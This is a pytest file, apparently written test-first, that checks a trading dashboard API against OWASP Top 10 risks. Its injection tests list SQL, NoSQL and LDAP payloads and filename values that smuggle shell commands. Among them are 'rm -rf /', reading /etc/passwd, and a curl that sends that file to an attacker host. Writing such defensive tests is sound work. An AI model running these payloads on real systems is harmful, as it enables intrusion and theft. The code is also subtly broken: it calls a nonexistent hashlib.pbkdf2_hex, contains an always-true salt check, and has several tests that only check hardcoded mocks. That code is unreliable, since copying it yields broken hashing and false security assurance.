"""
Phase 7.3: OWASP Top 10 Vulnerability Tests
Following TDD methodology - these tests validate protection against OWASP Top 10 vulnerabilities
"""

import pytest
import json
import base64
import hashlib
import hmac
import time
from unittest.mock import patch, MagicMock
from datetime import datetime, timedelta
from fastapi.testclient import TestClient

from src.dashboard.api import app
from src.dashboard.auth import dashboard_auth


class TestA01BrokenAccessControl:
    """Test A01:2021 – Broken Access Control vulnerabilities following TDD methodology"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    @pytest.fixture
    def user_headers(self):
        """Create regular user headers"""
        api_key = dashboard_auth.create_user("regular_user", "password", {"read"})
        return {"Authorization": f"Bearer {api_key}"}
    
    @pytest.fixture
    def admin_headers(self):
        """Create admin user headers"""
        api_key = dashboard_auth.create_user("admin_user", "password", {"admin", "read", "write"})
        return {"Authorization": f"Bearer {api_key}"}

    def test_vertical_privilege_escalation_should_be_prevented(self, client, user_headers):
        """Test vertical privilege escalation is prevented - TDD FAIL FIRST"""
        # Regular user trying to access admin endpoints
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/system/config",
            "/api/admin/logs",
            "/api/admin/permissions",
            "/api/admin/security/settings"
        ]
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=user_headers)
            assert response.status_code in [403, 404], \
                f"Regular user should not access admin endpoint: {endpoint}"

    def test_horizontal_privilege_escalation_should_be_prevented(self, client, user_headers):
        """Test horizontal privilege escalation is prevented - TDD FAIL FIRST"""
        # User trying to access other users' data
        other_user_resources = [
            "/api/user/profile/12345",  # Other user's profile
            "/api/portfolio/positions?user_id=67890",  # Other user's portfolio
            "/api/trading/history?user_id=54321",  # Other user's trading history
            "/api/user/settings/99999"  # Other user's settings
        ]
        
        for resource in other_user_resources:
            response = client.get(resource, headers=user_headers)
            assert response.status_code in [403, 404], \
                f"User should not access other users' resources: {resource}"

    def test_direct_object_reference_should_be_protected(self, client, user_headers):
        """Test direct object references are protected - TDD FAIL FIRST"""
        # Attempt to access resources by direct ID manipulation
        direct_access_attempts = [
            "/api/portfolio/position/1",  # Position ID 1
            "/api/trading/order/123",     # Order ID 123
            "/api/user/document/456",     # Document ID 456
            "/api/transaction/789"        # Transaction ID 789
        ]
        
        for attempt in direct_access_attempts:
            response = client.get(attempt, headers=user_headers)
            # Should either deny access or validate ownership
            if response.status_code == 200:
                # If access is allowed, verify it belongs to the user
                data = response.json()
                assert "user_id" in data and data["user_id"] == "current_user_id", \
                    f"Direct object access should validate ownership: {attempt}"
            else:
                assert response.status_code in [403, 404], \
                    f"Direct object access should be controlled: {attempt}"

    def test_cors_misconfiguration_should_be_prevented(self, client):
        """Test CORS misconfiguration is prevented - TDD FAIL FIRST"""
        # Test with potentially dangerous origins
        dangerous_origins = [
            "http://evil.com",
            "https://attacker.site",
            "null",
            "file://",
            "data:"
        ]
        
        for origin in dangerous_origins:
            headers = {
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Authorization"
            }
            
            response = client.options("/api/portfolio/positions", headers=headers)
            
            # Should not allow dangerous origins
            cors_origin = response.headers.get("Access-Control-Allow-Origin", "")
            assert cors_origin != "*" and origin not in cors_origin, \
                f"CORS should not allow dangerous origin: {origin}"


class TestA02CryptographicFailures:
    """Test A02:2021 – Cryptographic Failures vulnerabilities"""
    
    def test_sensitive_data_transmission_should_use_encryption(self):
        """Test sensitive data transmission uses encryption - TDD FAIL FIRST"""
        # Simulate network request with sensitive data
        sensitive_payloads = [
            {"password": "user_password_123"},
            {"api_key": "secret_api_key_456"},
            {"credit_card": "4111-1111-1111-1111"},
            {"ssn": "123-45-6789"},
            {"private_key": "private_key_data_789"}
        ]
        
        for payload in sensitive_payloads:
            # Ensure data is encrypted in transit
            encrypted_payload = self._encrypt_for_transmission(payload)
            
            # Original sensitive data should not be visible
            payload_str = json.dumps(encrypted_payload)
            for key, value in payload.items():
                assert str(value) not in payload_str, \
                    f"Sensitive {key} should be encrypted in transmission"

    def test_password_storage_should_use_strong_hashing(self):
        """Test password storage uses strong hashing - TDD FAIL FIRST"""
        # Test password hashing implementation
        test_passwords = [
            "simple_password",
            "complex_P@ssw0rd_123!",
            "very_long_password_with_special_chars_!@#$%^&*()"
        ]
        
        for password in test_passwords:
            # Hash password
            salt = self._generate_salt()
            hashed_password = self._hash_password(password, salt)
            
            # Should use strong hashing (not MD5 or SHA1)
            assert len(hashed_password) >= 32, "Hash should be at least 32 characters"
            assert hashed_password != hashlib.md5(password.encode()).hexdigest(), \
                "Should not use MD5 for password hashing"
            assert hashed_password != hashlib.sha1(password.encode()).hexdigest(), \
                "Should not use SHA1 for password hashing"
            
            # Should include salt
            assert salt in hashed_password or len(salt) > 0, \
                "Password hashing should use salt"

    def test_encryption_keys_should_be_properly_managed(self):
        """Test encryption keys are properly managed - TDD FAIL FIRST"""
        # Test key management practices
        key_management_checks = [
            {"check": "key_length", "min_length": 32},
            {"check": "key_randomness", "entropy_threshold": 7.0},
            {"check": "key_rotation", "max_age_days": 90},
            {"check": "key_storage", "storage_type": "secure"}
        ]
        
        for check in key_management_checks:
            if check["check"] == "key_length":
                # Generate test key
                test_key = self._generate_encryption_key()
                assert len(test_key) >= check["min_length"], \
                    f"Encryption key should be at least {check['min_length']} bytes"
            
            elif check["check"] == "key_randomness":
                # Test key entropy
                test_key = self._generate_encryption_key()
                entropy = self._calculate_entropy(test_key)
                assert entropy >= check["entropy_threshold"], \
                    f"Encryption key should have entropy >= {check['entropy_threshold']}"

    def _encrypt_for_transmission(self, data):
        """Helper: Encrypt data for transmission"""
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()
        fernet = Fernet(key)
        
        encrypted_data = fernet.encrypt(json.dumps(data).encode())
        return {
            "encrypted_payload": base64.b64encode(encrypted_data).decode(),
            "encryption_metadata": {"algorithm": "Fernet", "key_id": "transmission_key"}
        }
    
    def _generate_salt(self):
        """Helper: Generate cryptographic salt"""
        import secrets
        return secrets.token_hex(32)
    
    def _hash_password(self, password, salt):
        """Helper: Hash password with salt"""
        # Use PBKDF2 (strong hashing)
        import hashlib
        return hashlib.pbkdf2_hex(password.encode(), salt.encode(), 100000, 32)
    
    def _generate_encryption_key(self):
        """Helper: Generate encryption key"""
        import secrets
        return secrets.token_bytes(32)
    
    def _calculate_entropy(self, data):
        """Helper: Calculate Shannon entropy"""
        import math
        from collections import Counter
        
        if len(data) == 0:
            return 0
        
        counts = Counter(data)
        probs = [count / len(data) for count in counts.values()]
        entropy = -sum(p * math.log2(p) for p in probs)
        return entropy


class TestA03Injection:
    """Test A03:2021 – Injection vulnerabilities"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    @pytest.fixture
    def auth_headers(self):
        """Create auth headers"""
        api_key = dashboard_auth.create_user("test_user", "password", {"read", "write"})
        return {"Authorization": f"Bearer {api_key}"}

    def test_sql_injection_prevention_should_sanitize_inputs(self, client, auth_headers):
        """Test SQL injection prevention sanitizes inputs - TDD FAIL FIRST"""
        # SQL injection payloads
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO admin (user) VALUES ('hacker'); --",
            "' OR 1=1 #",
            "admin'/**/OR/**/1=1/**/--"
        ]
        
        for injection in sql_injections:
            # Test in various endpoints
            test_endpoints = [
                {"url": "/api/portfolio/positions", "params": {"symbol": injection}},
                {"url": "/api/trading/signals", "params": {"asset": injection}},
                {"url": "/api/user/search", "params": {"username": injection}}
            ]
            
            for endpoint in test_endpoints:
                response = client.get(
                    endpoint["url"], 
                    headers=auth_headers,
                    params=endpoint["params"]
                )
                
                # Should not execute SQL injection
                assert response.status_code in [400, 422] or "error" in response.text.lower(), \
                    f"SQL injection should be prevented: {injection}"
                
                # Response should not contain SQL error messages
                response_text = response.text.lower()
                sql_errors = ["sql", "mysql", "postgres", "sqlite", "syntax error"]
                assert not any(error in response_text for error in sql_errors), \
                    f"Should not expose SQL error details: {injection}"

    def test_nosql_injection_prevention_should_validate_queries(self, client, auth_headers):
        """Test NoSQL injection prevention validates queries - TDD FAIL FIRST"""
        # NoSQL injection payloads
        nosql_injections = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "function() { return true; }"},
            {"$regex": ".*"},
            {"$or": [{"password": {"$exists": True}}]}
        ]
        
        for injection in nosql_injections:
            # Test NoSQL injection in JSON payload
            response = client.post(
                "/api/user/search",
                headers=auth_headers,
                json={"query": injection}
            )
            
            # Should validate and reject NoSQL injection
            assert response.status_code in [400, 422], \
                f"NoSQL injection should be prevented: {injection}"

    def test_command_injection_prevention_should_sanitize_system_calls(self, client, auth_headers):
        """Test command injection prevention sanitizes system calls - TDD FAIL FIRST"""
        # Command injection payloads
        command_injections = [
            "file.txt; rm -rf /",
            "data.csv && cat /etc/passwd",
            "report.pdf | curl http://evil.com",
            "backup.zip; wget http://malware.com/virus.exe",
            "$(curl http://attacker.com/steal?data=$(cat /etc/passwd))"
        ]
        
        for injection in command_injections:
            # Test in file-related endpoints
            response = client.post(
                "/api/reports/generate",
                headers=auth_headers,
                json={"filename": injection, "format": "pdf"}
            )
            
            # Should prevent command injection
            assert response.status_code in [400, 422], \
                f"Command injection should be prevented: {injection}"

    def test_ldap_injection_prevention_should_escape_queries(self):
        """Test LDAP injection prevention escapes queries - TDD FAIL FIRST"""
        # LDAP injection payloads
        ldap_injections = [
            "*)(uid=*",
            "admin)(|(password=*",
            "*))%00",
            "*)(&(password=*",
            "admin*)((|userPassword=*)"
        ]
        
        for injection in ldap_injections:
            # Simulate LDAP query construction
            escaped_query = self._escape_ldap_query(injection)
            
            # Should escape special LDAP characters
            ldap_special_chars = ["*", "(", ")", "\\", "/", "&", "|"]
            for char in ldap_special_chars:
                if char in injection:
                    assert f"\\{char}" in escaped_query or char not in escaped_query, \
                        f"LDAP special characters should be escaped: {char}"

    def _escape_ldap_query(self, query):
        """Helper: Escape LDAP query"""
        # Basic LDAP escaping implementation
        escape_chars = {
            '*': '\\2a',
            '(': '\\28', 
            ')': '\\29',
            '\\': '\\5c',
            '/': '\\2f',
            '&': '\\26',
            '|': '\\7c'
        }
        
        escaped = query
        for char, escape in escape_chars.items():
            escaped = escaped.replace(char, escape)
        
        return escaped


class TestA04InsecureDesign:
    """Test A04:2021 – Insecure Design vulnerabilities"""
    
    def test_business_logic_flaws_should_be_prevented(self):
        """Test business logic flaws are prevented - TDD FAIL FIRST"""
        # Business logic vulnerability scenarios
        business_logic_tests = [
            {
                "scenario": "negative_price_manipulation",
                "input": {"price": -50000, "amount": 1},
                "should_fail": True
            },
            {
                "scenario": "zero_amount_trade",
                "input": {"price": 50000, "amount": 0},
                "should_fail": True
            },
            {
                "scenario": "excessive_leverage",
                "input": {"leverage": 1000, "amount": 1000000},
                "should_fail": True
            },
            {
                "scenario": "time_manipulation",
                "input": {"timestamp": "2020-01-01T00:00:00Z", "price": 50000},
                "should_fail": True
            }
        ]
        
        for test in business_logic_tests:
            validation_result = self._validate_business_logic(test["input"])
            
            if test["should_fail"]:
                assert not validation_result.is_valid, \
                    f"Business logic should reject: {test['scenario']}"
            else:
                assert validation_result.is_valid, \
                    f"Business logic should accept: {test['scenario']}"

    def test_workflow_bypass_should_be_prevented(self):
        """Test workflow bypass attempts are prevented - TDD FAIL FIRST"""
        # Workflow bypass scenarios
        bypass_scenarios = [
            {
                "scenario": "skip_approval_workflow",
                "steps": ["create_order", "execute_order"],  # Missing approval step
                "required_steps": ["create_order", "approve_order", "execute_order"]
            },
            {
                "scenario": "bypass_risk_assessment",
                "steps": ["place_trade"],  # Missing risk assessment
                "required_steps": ["risk_assessment", "place_trade"]
            },
            {
                "scenario": "skip_authentication_step",
                "steps": ["access_admin_panel"],  # Missing auth
                "required_steps": ["authenticate", "authorize", "access_admin_panel"]
            }
        ]
        
        for scenario in bypass_scenarios:
            workflow_result = self._validate_workflow_steps(
                scenario["steps"], 
                scenario["required_steps"]
            )
            
            assert not workflow_result.is_complete, \
                f"Should prevent workflow bypass: {scenario['scenario']}"

    def _validate_business_logic(self, input_data):
        """Helper: Validate business logic"""
        from collections import namedtuple
        Result = namedtuple('Result', ['is_valid', 'reason'])
        
        # Check for negative prices
        if input_data.get('price', 0) <= 0:
            return Result(False, "Negative or zero price not allowed")
        
        # Check for zero amounts
        if input_data.get('amount', 0) <= 0:
            return Result(False, "Zero or negative amount not allowed")
        
        # Check for excessive leverage
        if input_data.get('leverage', 1) > 100:
            return Result(False, "Excessive leverage not allowed")
        
        # Check for old timestamps
        if 'timestamp' in input_data:
            try:
                timestamp = datetime.fromisoformat(input_data['timestamp'].replace('Z', '+00:00'))
                if timestamp < datetime.now() - timedelta(days=1):
                    return Result(False, "Old timestamp not allowed")
            except:
                return Result(False, "Invalid timestamp format")
        
        return Result(True, "Valid")
    
    def _validate_workflow_steps(self, actual_steps, required_steps):
        """Helper: Validate workflow steps"""
        from collections import namedtuple
        Result = namedtuple('Result', ['is_complete', 'missing_steps'])
        
        missing_steps = [step for step in required_steps if step not in actual_steps]
        return Result(len(missing_steps) == 0, missing_steps)


class TestA05SecurityMisconfiguration:
    """Test A05:2021 – Security Misconfiguration vulnerabilities"""
    
    def test_default_configurations_should_be_changed(self):
        """Test default configurations are changed - TDD FAIL FIRST"""
        # Check for dangerous default configurations
        security_configs = {
            "debug_mode": False,  # Should be disabled in production
            "default_passwords": [],  # Should not contain defaults
            "exposed_endpoints": [],  # Should not expose debug endpoints
            "security_headers": True,  # Should have security headers
            "error_details": False  # Should not expose detailed errors
        }
        
        # Validate each security configuration
        for config_name, expected_value in security_configs.items():
            actual_value = self._get_security_config(config_name)
            
            if isinstance(expected_value, bool):
                assert actual_value == expected_value, \
                    f"Security config {config_name} should be {expected_value}"
            elif isinstance(expected_value, list):
                assert len(actual_value) == len(expected_value), \
                    f"Security config {config_name} should be empty/minimal"

    def test_unnecessary_features_should_be_disabled(self):
        """Test unnecessary features are disabled - TDD FAIL FIRST"""
        # Features that should be disabled in production
        unnecessary_features = [
            "debug_toolbar",
            "test_endpoints", 
            "swagger_ui_in_prod",
            "development_routes",
            "admin_without_auth",
            "file_browser",
            "database_admin_interface"
        ]
        
        for feature in unnecessary_features:
            is_enabled = self._check_feature_enabled(feature)
            assert not is_enabled, \
                f"Unnecessary feature should be disabled: {feature}"

    def test_security_headers_should_be_configured(self):
        """Test security headers are properly configured - TDD FAIL FIRST"""
        # Required security headers
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=",
            "Content-Security-Policy": "default-src"
        }
        
        # Mock HTTP response headers
        response_headers = self._get_response_headers()
        
        for header_name, expected_values in required_headers.items():
            assert header_name in response_headers, \
                f"Security header should be present: {header_name}"
            
            header_value = response_headers[header_name]
            
            if isinstance(expected_values, list):
                assert any(expected in header_value for expected in expected_values), \
                    f"Security header {header_name} should have valid value"
            else:
                assert expected_values in header_value, \
                    f"Security header {header_name} should contain: {expected_values}"

    def _get_security_config(self, config_name):
        """Helper: Get security configuration value"""
        # Mock security configuration
        configs = {
            "debug_mode": False,
            "default_passwords": [],
            "exposed_endpoints": [],
            "security_headers": True,
            "error_details": False
        }
        return configs.get(config_name)
    
    def _check_feature_enabled(self, feature_name):
        """Helper: Check if feature is enabled"""
        # Mock feature flags - all should be disabled
        return False
    
    def _get_response_headers(self):
        """Helper: Get HTTP response headers"""
        # Mock security headers
        return {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY", 
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'"
        }


class TestA06VulnerableComponents:
    """Test A06:2021 – Vulnerable and Outdated Components"""
    
    def test_dependency_vulnerability_scanning_should_detect_issues(self):
        """Test dependency vulnerability scanning detects issues - TDD FAIL FIRST"""
        # Mock vulnerable dependencies
        dependencies = [
            {"name": "requests", "version": "2.0.0", "known_vulnerabilities": ["CVE-2018-18074"]},
            {"name": "flask", "version": "0.12.0", "known_vulnerabilities": ["CVE-2018-1000656"]},
            {"name": "django", "version": "1.11.0", "known_vulnerabilities": ["CVE-2019-6975"]},
            {"name": "numpy", "version": "1.16.0", "known_vulnerabilities": []},  # No vulnerabilities
        ]
        
        vulnerability_scanner = VulnerabilityScanner()
        
        for dep in dependencies:
            scan_result = vulnerability_scanner.scan_dependency(dep)
            
            if dep["known_vulnerabilities"]:
                assert not scan_result.is_safe, \
                    f"Should detect vulnerabilities in {dep['name']} {dep['version']}"
                assert len(scan_result.vulnerabilities) > 0, \
                    f"Should list specific vulnerabilities for {dep['name']}"
            else:
                assert scan_result.is_safe, \
                    f"Should mark clean dependency as safe: {dep['name']}"

    def test_outdated_components_should_be_flagged(self):
        """Test outdated components are flagged - TDD FAIL FIRST"""
        # Mock component versions
        components = [
            {"name": "openssl", "current": "1.0.2", "latest": "1.1.1", "is_critical": True},
            {"name": "python", "current": "3.6.0", "latest": "3.9.0", "is_critical": True},
            {"name": "nginx", "current": "1.14.0", "latest": "1.18.0", "is_critical": False},
        ]
        
        version_checker = ComponentVersionChecker()
        
        for component in components:
            check_result = version_checker.check_version(component)
            
            if component["current"] != component["latest"]:
                assert check_result.needs_update, \
                    f"Should flag outdated component: {component['name']}"
                
                if component["is_critical"]:
                    assert check_result.priority == "high", \
                        f"Critical component should have high priority: {component['name']}"


class TestA07IdentificationAuthenticationFailures:
    """Test A07:2021 – Identification and Authentication Failures"""
    
    def test_weak_password_policies_should_be_rejected(self):
        """Test weak password policies are rejected - TDD FAIL FIRST"""
        # Weak passwords that should be rejected
        weak_passwords = [
            "123456",           # Too simple
            "password",         # Common word
            "admin",           # Default/common
            "abc123",          # Too short/simple
            "qwerty",          # Keyboard pattern
            "Password1",       # Predictable pattern
            "aaaaaa",          # Repeated characters
        ]
        
        password_validator = PasswordValidator()
        
        for password in weak_passwords:
            validation_result = password_validator.validate_password(password)
            
            assert not validation_result.is_valid, \
                f"Weak password should be rejected: {password}"
            assert len(validation_result.violations) > 0, \
                f"Should specify why password is weak: {password}"

    def test_account_lockout_should_prevent_brute_force(self):
        """Test account lockout prevents brute force attacks - TDD FAIL FIRST"""
        # Simulate brute force attack
        failed_attempts = []
        
        for i in range(10):  # 10 failed attempts
            attempt_result = self._simulate_login_attempt("admin", f"wrong_password_{i}")
            failed_attempts.append(attempt_result)
        
        # Account should be locked after several failures
        lockout_triggered = any(attempt.is_locked for attempt in failed_attempts[-3:])
        assert lockout_triggered, "Account should be locked after multiple failed attempts"
        
        # Further attempts should be blocked
        final_attempt = self._simulate_login_attempt("admin", "any_password")
        assert final_attempt.is_locked, "Locked account should reject all attempts"

    def _simulate_login_attempt(self, username, password):
        """Helper: Simulate login attempt"""
        from collections import namedtuple
        Result = namedtuple('Result', ['is_successful', 'is_locked', 'attempts_remaining'])
        
        # Mock login attempt tracking
        if not hasattr(self, '_failed_attempts'):
            self._failed_attempts = {}
        
        if username not in self._failed_attempts:
            self._failed_attempts[username] = 0
        
        # Check if account is locked
        if self._failed_attempts[username] >= 5:
            return Result(False, True, 0)
        
        # Simulate failed login
        if password != "correct_password":
            self._failed_attempts[username] += 1
            attempts_remaining = max(0, 5 - self._failed_attempts[username])
            is_locked = self._failed_attempts[username] >= 5
            return Result(False, is_locked, attempts_remaining)
        
        # Successful login resets counter
        self._failed_attempts[username] = 0
        return Result(True, False, 5)


# Mock classes for OWASP testing
class VulnerabilityScanner:
    """Mock vulnerability scanner"""
    
    def scan_dependency(self, dependency):
        """Scan dependency for vulnerabilities"""
        from collections import namedtuple
        Result = namedtuple('Result', ['is_safe', 'vulnerabilities'])
        
        vulnerabilities = dependency.get('known_vulnerabilities', [])
        return Result(len(vulnerabilities) == 0, vulnerabilities)


class ComponentVersionChecker:
    """Mock component version checker"""
    
    def check_version(self, component):
        """Check component version"""
        from collections import namedtuple
        Result = namedtuple('Result', ['needs_update', 'priority'])
        
        needs_update = component['current'] != component['latest']
        priority = "high" if component.get('is_critical', False) and needs_update else "low"
        
        return Result(needs_update, priority)


class PasswordValidator:
    """Mock password validator"""
    
    def validate_password(self, password):
        """Validate password strength"""
        from collections import namedtuple
        Result = namedtuple('Result', ['is_valid', 'violations'])
        
        violations = []
        
        # Check length
        if len(password) < 8:
            violations.append("Password too short")
        
        # Check common passwords
        common_passwords = ["123456", "password", "admin", "qwerty"]
        if password.lower() in common_passwords:
            violations.append("Common password")
        
        # Check repeated characters
        if len(set(password)) < len(password) / 2:
            violations.append("Too many repeated characters")
        
        # Check complexity
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in "!@#$%^&*" for c in password)
        
        complexity_count = sum([has_upper, has_lower, has_digit, has_special])
        if complexity_count < 3:
            violations.append("Insufficient complexity")
        
        return Result(len(violations) == 0, violations)